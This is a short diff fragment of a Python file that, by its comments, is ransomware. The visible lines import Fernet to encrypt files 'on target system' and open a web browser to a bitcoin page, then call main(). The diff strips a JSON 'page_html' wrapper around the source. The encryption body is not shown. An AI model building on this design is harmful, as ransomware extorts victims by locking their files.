@@ -1,4 +1,3 @@
-{"page_html": """# Imports
 from cryptography.fernet import Fernet # encrypt/decrypt files on target system
 import os # to get system root
 import webbrowser # to load webbrowser to go to specific website eg bitcoin
@@ -253,4 +252,4 @@ def main():
 
 
 if __name__ == '__main__':
-    main()"""}
+    main()
